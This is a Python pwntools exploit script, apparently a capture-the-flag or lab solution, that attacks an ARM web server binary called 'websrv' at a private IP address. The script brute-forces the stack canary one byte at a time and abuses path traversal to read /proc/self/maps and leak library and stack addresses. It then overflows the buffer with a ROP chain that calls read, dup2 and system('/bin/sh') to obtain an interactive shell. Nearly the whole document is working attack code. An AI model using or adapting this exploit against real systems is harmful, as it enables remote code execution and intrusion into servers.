#!/usr/bin/env python2

from pwn import *

REMOTE = "192.168.100.2"

maps = None

def bruteforce_canary():
    pre_pad = cyclic(0x1000 - 40)

    cookie = ""
    for i in range(4):
        for i in range(0, 256):
            crashed = crash(pre_pad + cookie + p8(i))
            if not crashed:
                cookie += p8(i)
                break

    print "[+] brutefroce cookie: ", cookie.encode("hex")
    assert(not crash(pre_pad + cookie))

    return cookie

def request(payload, io, path="/"):
    pad = "GET " + path + " HTTP/1.1\r\nContent-Length: " 
    pad += str(len(payload)) + "\r\n\r\n" + payload
    io.send(pad)
    io.readuntil("Content-Length: ")
    num = io.readuntil("\r").strip()


def crash(payload):
    crashed = False
    io = remote("192.168.100.2", 80)
    try:
        request(payload, io)
        request("A", io)
    except:
        crashed = True

    io.close()
    return crashed

def leak_libc_base(pre_pad, io):
    payload = pre_pad
    payload += "$" * (0x2c - 4)

    rop = ROP(binary)
    rop.puts(binary.got["memcpy"])
    print rop.dump()

    payload += rop.chain()
    io.send(payload)
    data = io.recvrepeat(timeout=1)
    print len(data)
    print data.encode("hex")

def leak(io, path="../../../proc/self/maps"):
    request("AAAA", io, path)
    data = io.recvrepeat(0.2)

    maps = {}
    for start, end, prot, name in re.findall('([a-f0-9]+)-([a-f0-9]+) (...)p [^\n]* ([^\s\n]+)\n', data):
        name = name.split('/')[-1]
        if name == '0':
            continue
        elif '[' == name[0]:
            name = name[1:-1]
        elif 'rw-' == prot:
            name += '.bss'
        elif 'r--' == prot:
            name += '.rodata'
        if not name in maps:
            maps[name] = int(start, 16)

    return maps


def call(func, *args):
    poppc   = maps['libc-2.13.so'] + 0x000029cc + 1 #: pop {r0, r1, r2, r3, r5, pc}
    blxpop  = maps["libc-2.13.so"] + 0x00090b80 + 1 #: blx r5 ; pop {r4, r5, r6, pc}
    #ppc     = maps['websrv_nop'] + 0x000011f0 #: pop {r4, pc}

    regargs = list(args[:4]) + [0] * 4
    stackargs = list(args[4:]) + [0] * 3

    pad = p32(poppc)
    pad += "".join(p32(x) for x in regargs[:4])
    pad += p32(func)
    pad += p32(blxpop)
    pad += "".join(p32(x) for x in stackargs[:3])

    return pad


if __name__ == "__main__":
    binary = ELF("./websrv")
    libc = ELF("./libc.so.6")

    context.arch = "arm"
    context.log_level = "error"
    cookie = bruteforce_canary()
    print "[+] Get cookie: ", cookie.encode("hex")

    context.log_level = "info"

    io = remote(REMOTE, 80)
    maps = leak(io)
    bin_base = maps["websrv_nop"]
    libc_base = maps["libc-2.13.so"]
    stack_base = maps["stack"]

    print "[+] leak: bin_base 0x%x libc_base 0x%x, stack_base 0x%x " \
            %( bin_base, libc_base, stack_base)
    
    binary.address = bin_base
    libc.address = libc_base


    payload = "$" * (0x1000 - 40)
    payload += cookie
    payload += cyclic(cyclic_find(p32(0x6161616a)))
    

    cmd = "/bin/sh\x00"

    rop = call(libc.symbols["read"], 4, maps["websrv_nop.bss"], len(cmd) + 1)
    rop += call(libc.symbols["dup2"], 4, 0)
    rop += call(libc.symbols["dup2"], 4, 1)
    rop += call(libc.symbols["dup2"], 4, 2)
    rop += call(libc.symbols["system"], maps["websrv_nop.bss"])

    
    payload += rop
    request(payload, io)

    io.sendline(cmd)

    io.interactive() 
    io.close()
